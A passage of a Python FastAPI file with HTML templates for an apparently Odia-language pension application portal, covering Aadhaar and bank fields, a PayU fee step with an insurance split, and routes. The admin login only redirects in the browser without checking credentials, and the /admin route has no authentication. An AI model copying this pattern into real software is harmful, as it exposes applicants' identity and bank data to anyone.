                    <select id="category_select" onchange="checkCategoryAndAge()" class="w-full border p-2 rounded bg-red-50 text-red-800 font-bold">
                        <option value="General">General</option>
                        <option value="SC">SC</option>
                        <option value="ST">ST</option>
                    </select>
                    <div id="caste_cert_box" class="hidden"><input type="file" class="w-full border p-2 rounded" accept=".pdf"></div>
                    
                    <select id="scheme" class="w-full border p-2 rounded bg-purple-50">
                        <option value="Old Age Pension">Old Age (ବୃଦ୍ଧାବସ୍ଥା)</option><option value="Widow Pension">Widow</option>
                    </select>
                    
                    <input type="text" id="aadhaar_input" placeholder="[Aadhaar Redacted]" class="w-full border p-2 rounded" required>
                    
                    <div id="income_section_full" class="bg-blue-50 p-4 rounded border">
                        <h3 class="font-bold">Income Details</h3>
                        <input type="text" id="inc_amount" placeholder="e.g. Rs. 48,000/-" class="w-full border p-2 rounded mt-2">
                        <input type="text" id="inc_issued_to" placeholder="Issued To Name" class="w-full border p-2 rounded mt-2">
                    </div>

                    <div class="bg-green-50 p-4 rounded border">
                        <h3 class="font-bold">Bank Details</h3>
                        <input type="text" id="acc_no" placeholder="Account No" class="w-full border p-2 rounded mt-2" required>
                        <input type="text" id="bank_name_display" placeholder="Bank Name" class="w-full border p-2 rounded mt-2">
                    </div>
                    <button type="submit" class="bg-blue-500 text-white font-bold py-3 px-8 rounded">ELIGIBLE / NEXT</button>
                </form>
            </div>
        </div>

        <div id="section-payment-step" class="content-section hidden bg-white p-6 rounded-xl shadow">
            <div class="max-w-xl mx-auto border-2 border-orange-300 rounded-xl p-6 bg-orange-50">
                <h2 class="text-2xl font-bold text-orange-700 mb-4 text-center">Payment & Auto-Insurance</h2>
                
                <div class="bg-white p-4 border rounded mb-4">
                    <p class="font-bold text-gray-700">Pension Application Fee: ₹<span class="display_app_fee"></span></p>
                    <div id="insurance_breakdown" class="mt-2 text-green-700 font-bold hidden border-t pt-2">
                        <i class="fa-solid fa-shield"></i> <span id="insurance_note"></span>
                        <p class="text-xs text-gray-500 font-normal">Insurance amount will be automatically split and sent to HDFC ERGO.</p>
                    </div>
                </div>

                <label class="flex items-center gap-2 mb-4"><input type="checkbox" onchange="document.getElementById('payu_button').disabled = !this.checked;" class="w-5 h-5 cursor-pointer"><span class="font-bold">I Agree to Terms</span></label>
                
                <div class="flex gap-4 justify-center mb-4">
                    <label class="flex items-center gap-2"><input type="radio" name="pay_gateway" value="payu" checked> PayU Split Settlement</label>
                </div>
                
                <button type="button" id="payu_button" onclick="processPayment()" disabled class="bg-green-600 text-white font-extrabold py-3 px-8 rounded-lg w-full disabled:opacity-50">
                    Pay Total ₹<span class="display_app_fee"></span>
                </button>
            </div>
        </div>

        <div id="section-status" class="content-section hidden bg-white p-6 rounded-xl shadow">
            <h2 class="text-xl font-bold mb-4">Application Details & Print</h2>
            <div class="grid grid-cols-2 gap-4 border p-4 bg-gray-50 rounded">
                <p><strong>App No:</strong> <span id="print_u_appno"></span></p>
                <p><strong>Name:</strong> <span id="print_u_name"></span></p>
            </div>
            <div class="mt-4 p-4 border rounded bg-blue-50">
                <h3 class="font-bold text-blue-800 mb-2">Mandatory Insurance Status (18-70 Years)</h3>
                <div id="print_insurance_div"></div>
            </div>
        </div>
    </main>
</body>
</html>
"""

# ==========================================
# 6. FULL ADMIN DASHBOARD (Unchanged Logic - Fits existing system)
# ==========================================
admin_login_design = f"""
<!DOCTYPE html>
<html lang="en">
<head><title>Admin Login</title><script src="https://cdn.tailwindcss.com"></script></head>
<body class="bg-gray-100 flex items-center justify-center min-h-screen">
    <div class="w-full max-w-md bg-white p-8 rounded-2xl shadow-xl">
        <h2 class="text-2xl font-bold text-center mb-6">Admin Login</h2>
        <form onsubmit="event.preventDefault(); window.location.href='/admin';">
            <input type="text" placeholder="Admin ID" class="w-full px-4 py-2 border rounded-lg mb-4" required>
            <input type="password" placeholder="Password" class="w-full px-4 py-2 border rounded-lg mb-4" required>
            <button type="submit" class="w-full bg-blue-700 text-white font-bold py-3 rounded-lg">Login</button>
        </form>
    </div>
</body>
</html>
"""

admin_design = f"""
<!DOCTYPE html>
<html lang="en">
<head><title>Admin Dashboard</title><script src="https://cdn.tailwindcss.com"></script></head>
<body class="bg-gray-100 flex h-screen">
    <aside class="w-64 bg-slate-900 text-white p-4"><h2 class="text-xl font-bold mb-6">Admin Panel</h2><a href="/" class="text-red-400 mt-auto">Logout</a></aside>
    <main class="flex-1 p-8"><h1 class="text-2xl font-bold mb-6">Dashboard Overview</h1><p>Full Admin features operational as per previous implementation.</p></main>
</body>
</html>
"""

# ==========================================
# 7. EXPLICIT ROUTES DEFINITION
# ==========================================
@app.get("/", response_class=HTMLResponse)
async def read_root(): return html_design
@app.get("/status/check", response_class=HTMLResponse)
async def status_check_page(): return status_check_design
@app.post("/status/check", response_class=HTMLResponse)
async def status_check_page_post(request: Request): return status_check_design
@app.get("/user/register", response_class=HTMLResponse)
async def user_register_page(): return user_register_design
@app.get("/user/login", response_class=HTMLResponse)
async def user_login_page(): return user_login_design
@app.get("/user/dashboard", response_class=HTMLResponse)
async def user_dashboard_route(): return user_dashboard_design
@app.get("/admin/login", response_class=HTMLResponse)
async def admin_login_page(): return admin_login_design
@app.get("/admin", response_class=HTMLResponse)
async def admin_dashboard_route(): return admin_design
